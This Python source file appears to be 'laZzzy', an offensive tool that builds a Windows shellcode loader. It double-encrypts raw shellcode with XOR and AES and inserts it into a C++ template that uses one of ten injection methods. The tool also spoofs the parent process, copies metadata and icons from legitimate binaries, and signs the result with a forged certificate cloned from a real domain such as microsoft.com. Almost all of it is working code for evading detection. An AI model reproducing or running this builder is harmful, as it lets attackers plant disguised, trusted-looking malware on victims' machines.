#!/usr/bin/env python3 

import os
import subprocess
import argparse
import shutil
import pefile
import icoextract
import ssl
import hashlib
from datetime import datetime
from OpenSSL import crypto
from itertools import cycle
from Crypto.Cipher import AES
from Crypto import Random
from string import Template

RELEASE_PATH = fr"{os.getcwd()}\loader\x64\Release\laZzzy.exe"

logo = ("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⠀⢀⣼⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⢀⣼⡿⠁⠀⠛⠛⠒⠒⢀⣀⡀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⠀⠀⣰⣾⠟⠋⠙⢻⣿⠀⠀⠛⠛⢛⣿⣿⠏⠀⣠⣿⣯⣤⣤⠄⠀⠀⠀⠀⠈⢿⣷⡀⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⠀⠀⣿⣯⠀⠀⠀⢸⣿⠀⠀⠀⣠⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⠀⠀⠙⠿⣷⣦⣴⢿⣿⠄⢀⣾⣿⣿⣶⣶⣶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀by: CaptMeelo⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀
""")

def exec_method():
   return """
shellcode execution method:
   1          Early-bird APC Queue (requires sacrificial proces)
   2          Thread Hijacking (requires sacrificial proces)
   3          KernelCallbackTable (requires sacrificial process that has GUI)
   4          Section View Mapping
   5          Thread Suspension
   6          LineDDA Callback
   7          EnumSystemGeoID Callback
   8          FLS Callback
   9          SetTimer
   10         Clipboard
"""

class CustomFormatter(argparse.RawTextHelpFormatter, argparse.ArgumentDefaultsHelpFormatter):
    pass


def xor_encrypt(data, password):
    salt = os.urandom(AES.block_size)
    key = hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1, dklen=16)

    padded_text = pad(data)
    cipher_text = bytes(a ^ b for a, b in zip(padded_text, cycle(key)))
    return cipher_text, key


def pad(shellcode):
    while len(shellcode) % AES.block_size != 0:
        shellcode += b"\x90"
    return shellcode


def aes_encrypt(data, password):
    salt = os.urandom(AES.block_size)    
    iv = Random.new().read(AES.block_size)    
    key = hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1, dklen=32)
    
    cipher_config = AES.new(key, AES.MODE_CBC, iv)
    cipher_text = cipher_config.encrypt(data)

    return cipher_text, iv, key
 

def pretty_hex(data):
    return "0x" + ", 0x".join(f"{i:02x}" for i in data)    


def modify_template(params, template):
    with open(template) as f:
        src = Template(f.read())
        result = src.substitute(params)
        f.close()
        return result


def generate_code(cipher_text, aes_key, aes_iv, xor_key, method, target_process, spawn_process, parent_process, current_dir):
    result = modify_template({"shellcode":cipher_text, "aes_key":aes_key, "aes_iv":aes_iv, "xor_key": xor_key, "method":method, "target_process":target_process, "spawn_process":spawn_process, "parent_process":parent_process, "current_dir":current_dir}, f"{os.getcwd()}\\template\\main.cpp")

    with open(f"{os.getcwd()}\\loader\\main.cpp","w+") as file:
        file.write(result)
        file.close()


def clone_meta(bin_path):
    filever = prodver  = "1, 0, 0, 0"
    company_name = file_desc = file_ver = internal_name = copyright = orig_file = prod_name = prod_ver = icon = "" 

    if bin_path is not None:
        print("\n[+] Spoofing metadata")
        print(f"\t[*] Binary: \t\t\t{bin_path}")
        
        pe = pefile.PE(bin_path)
        company_name = pe.FileInfo[0][0].StringTable[0].entries[b'CompanyName'].decode('utf-8')
        print(f"\t[*] CompanyName: \t\t{company_name}")

        file_desc = pe.FileInfo[0][0].StringTable[0].entries[b'FileDescription'].decode('utf-8')
        print(f"\t[*] FileDescription: \t\t{file_desc}")
        
        file_ver = pe.FileInfo[0][0].StringTable[0].entries[b'FileVersion'].decode('utf-8')
        filever = file_ver.split()[0].replace(".", ", ")
        print(f"\t[*] FileVersion: \t\t{file_ver}")
        
        internal_name = pe.FileInfo[0][0].StringTable[0].entries[b'InternalName'].decode('utf-8')
        print(f"\t[*] InternalName: \t\t{internal_name}")
        
        copyright = pe.FileInfo[0][0].StringTable[0].entries[b'LegalCopyright'].decode('utf-8')
        print(f"\t[*] LegalCopyright: \t\t{copyright}")
        
        orig_file = pe.FileInfo[0][0].StringTable[0].entries[b'OriginalFilename'].decode('utf-8')
        print(f"\t[*] OriginalFilename: \t\t{orig_file}")
        
        prod_name = pe.FileInfo[0][0].StringTable[0].entries[b'ProductName'].decode('utf-8')
        print(f"\t[*] ProductName: \t\t{prod_name}")
        
        prod_ver = pe.FileInfo[0][0].StringTable[0].entries[b'ProductVersion'].decode('utf-8')
        prodver = prod_ver.replace(".", ", ")
        print(f"\t[*] ProductVersion: \t\t{prod_ver}")
        
        pe.close()

    try:
        ico = icoextract.IconExtractor(bin_path)
    except:
        pass
    else:
        icoextract.IconExtractor(bin_path).export_icon(f"{os.getcwd()}\\loader\\icon.ico")
        icon = "MAIN ICON icon.ico"

    result = modify_template({"filever":filever, "prodver":prodver, "company_name":company_name, "file_desc":file_desc, "file_ver":file_ver, "internal_name": internal_name, "copyright":copyright, "orig_file":orig_file, "prod_name":prod_name, "prod_ver":prod_ver, "icon":icon}, f"{os.getcwd()}\\template\\resource.rc")

    with open(f"{os.getcwd()}\\loader\\resource.rc","w+") as file:
        file.write(result)
        file.close()

    if bin_path is not None:
        head, tail = os.path.split(bin_path)
        return tail
    else:
        return "laZzzy.exe"


def compile():
    env = os.getenv("ProgramFiles(x86)")
    cmd = f"\"{env}\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath"
    p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    out, err = p.communicate()
    
    msbuild_path = f"\"{out.decode('utf-8').strip()}\\MSBuild\\Current\\Bin\\MSBuild.exe\""
    solution_file = f"{os.getcwd()}\\loader\\laZzzy.sln"
    cmd = f"{msbuild_path} {solution_file} /p:Configuration=Release /p:Platform=x64 /v:q"
    p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    out, err = p.communicate()

    if p.returncode != 0:
        print("\n" + out.decode())
        print("\n" +err.decode())
        exit()


def sign_pe(domain, release_path):
    print(f"\t[*] Domain: \t\t\t{domain}")

    domain_cert = ssl.get_server_certificate((domain, 443))
    x509 = crypto.load_certificate(crypto.FILETYPE_PEM, domain_cert)

    key = crypto.PKey()
    key.generate_key(crypto.TYPE_RSA, x509.get_pubkey().bits())
    cert = crypto.X509()

    version = x509.get_version()
    cert.set_version(version)
    print(f"\t[*] Version: \t\t\t{version}")

    serial = x509.get_serial_number()
    sn = "{:x}".format(serial)
    sn = ":".join(sn[i:i+2] for i in range(0, len(sn), 2))
    cert.set_serial_number(serial)
    print(f"\t[*] Serial: \t\t\t{sn}")

    subject = x509.get_subject()
    cert.set_subject(subject)
    subj = "".join("/{:s}={:s}".format(name.decode(), value.decode()) for name, value in subject.get_components())
    print(f"\t[*] Subject: \t\t\t{subj}")

    issuer = x509.get_issuer()
    cert.set_issuer(issuer)
    iss = "".join("/{:s}={:s}".format(name.decode(), value.decode()) for name, value in issuer.get_components())
    print(f"\t[*] Issuer: \t\t\t{iss}")

    not_before = x509.get_notBefore()
    nb = datetime.strptime(not_before.decode(), "%Y%m%d%H%M%SZ").strftime("%B %d %Y")
    cert.set_notBefore(not_before)
    print(f"\t[*] Not Before: \t\t{nb}")

    not_after = x509.get_notAfter()
    na = datetime.strptime(not_after.decode(), "%Y%m%d%H%M%SZ").strftime("%B %d %Y")
    cert.set_notAfter(not_after)
    print(f"\t[*] Not After: \t\t\t{na}")

    cert.set_pubkey(key)
    cert.sign(key, "sha256")

    crt_data = crypto.dump_certificate(crypto.FILETYPE_PEM, cert)
    key_data = crypto.dump_privatekey(crypto.FILETYPE_PEM, key)

    pkcs = crypto.PKCS12()
    pkcs.set_privatekey(key)
    pkcs.set_certificate(cert)
    pfx_data = pkcs.export()

    crt_path = f"{os.getcwd()}\\output\\" + domain + ".crt"
    key_path = f"{os.getcwd()}\\output\\" + domain + ".key"
    pfx_path = f"{os.getcwd()}\\output\\" + domain + ".pfx"

    with open(crt_path,"wb") as file:
        file.write(crt_data)
        file.close()

    with open(key_path,"wb") as file:
        file.write(key_data)
        file.close()
   
    with open(pfx_path,"wb") as file:
        file.write(pfx_data)
        file.close()

    print(f"\t[*] PFX file: \t\t\t{pfx_path}")

    cmd = f"\"C:\\Program Files (x86)\\Microsoft SDKs\\ClickOnce\\SignTool\\signtool.exe\" sign /v /f {pfx_path} /fd SHA256 /tr http://sha256timestamp.ws.symantec.com/sha256/timestamp /td SHA256 {release_path}"
    p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    out, err = p.communicate()


def move_file(file_name, release_path):
    output_path = f"{os.getcwd()}\\output\\{file_name}"
    shutil.copy(release_path, output_path)
    return output_path


def clean_loader():
    shutil.rmtree(f"{os.getcwd()}\\loader\\x64")
    try:
        os.remove(f"{os.getcwd()}\\loader\\icon.ico")
        os.remove(f"{os.getcwd()}\\loader\\resource.rc")
    except:
        pass


def clean_output():
    output_dir = f"{os.getcwd()}\output"
    shutil.rmtree(output_dir)
    os.makedirs(output_dir)


if __name__ == "__main__":
    clean_output()

    print(logo)
    
    parser = argparse.ArgumentParser(formatter_class=CustomFormatter, argument_default=argparse.SUPPRESS, epilog=exec_method())
    parser.add_argument("-s", dest="shellcode", metavar="", required=True, help="path to raw shellcode")
    parser.add_argument("-p", dest="password", metavar="", required=True, help="password")
    parser.add_argument("-m", dest="method", metavar="", required=True, help="shellcode execution method (e.g. 1)", type=int, choices=[1, 2 , 3, 4, 5, 6, 7, 8, 9, 10])
    parser.add_argument("-tp", dest="target_process", metavar="", help="process to inject (e.g. svchost.exe)")
    parser.add_argument("-sp", dest="spawn_process", metavar="", help="process to spawn (e.g. C:\\\Windows\\\System32\\\RuntimeBroker.exe)")
    parser.add_argument("-pp", dest="parent_process", metavar="", help="parent process to spoof (e.g. explorer.exe)")
    parser.add_argument("-b", dest="bin_spoof", metavar="", help="binary to spoof metadata (e.g. C:\\\Windows\\\System32\\\RuntimeBroker.exe)")
    parser.add_argument("-d", dest="domain", metavar="", help="domain to spoof (e.g. www.microsoft.com)")
    args = parser.parse_args()

    if args.method in (1, 2, 3):
        args.target_process = None
        if None in (args.spawn_process, args.parent_process):
            parser.error("selected method requires -sp and -pp")
    elif args.method in (4, 5):
        args.spawn_process = args.parent_process = None
        if args.target_process is None:
            parser.error("selected method requires -tp")
    else:
        args.target_process = args.spawn_process = args.parent_process = None
    
    if not hasattr(args, "bin_spoof"):
        args.bin_spoof = None

    if not hasattr(args, "domain"):
        args.domain = None

    switcher = {
        1:  "Early-bird APC Queue",
        2:  "Thread Hijacking",
        3:  "KernelCallbackTable",
        4:  "Section View Mapping",
        5:  "Thread Suspension",
        6:  "LineDDA Callback",
        7:  "EnumSystemGeoID Callback",
        8:  "FLS Callback",
        9:  "SetTimer",
        10: "Clipboard"
    }

    plaintext = open(args.shellcode, "rb").read()

    xor_encrypted, xor_key = xor_encrypt(plaintext, args.password)
    print("[+] XOR-encrypting payload with")
    print("\t[*] Key: \t\t\t" + xor_key.hex())

    aes_encrypted, aes_iv, aes_key = aes_encrypt(xor_encrypted, args.password)
    print("\n[+] AES-encrypting payload with")
    print("\t[*] IV: \t\t\t" + aes_iv.hex())
    print("\t[*] Key: \t\t\t" + aes_key.hex())

    if args.spawn_process is not None:
        current_dir = "\\".join(args.spawn_process.split("\\")[0:-1]) + "\\"
    else:
        current_dir = None

    generate_code(pretty_hex(aes_encrypted), pretty_hex(aes_key), pretty_hex(aes_iv), pretty_hex(xor_key), args.method, args.target_process, args.spawn_process, args.parent_process, current_dir)
    print("\n[+] Modifying template using")
    print(f"\t[*] Technique: \t\t\t{switcher.get(args.method)}")
    print(f"\t[*] Process to inject: \t\t{args.target_process}")
    print(f"\t[*] Process to spawn: \t\t{args.spawn_process}")
    print(f"\t[*] Parent process to spoof: \t{args.parent_process}")

    file_name = clone_meta(args.bin_spoof)

    compile()
    print("\n[+] Compiling project")
    print(f"\t[*] Compiled executable: \t{RELEASE_PATH}")

    if args.domain is not None:
        print("\n[+] Signing binary with spoofed cert")
        sign_pe(args.domain, RELEASE_PATH)

    output_path = move_file(file_name, RELEASE_PATH)
    print("\n[+] All done!")
    print(f"\t[*] Output file: \t\t{output_path}")

    clean_loader()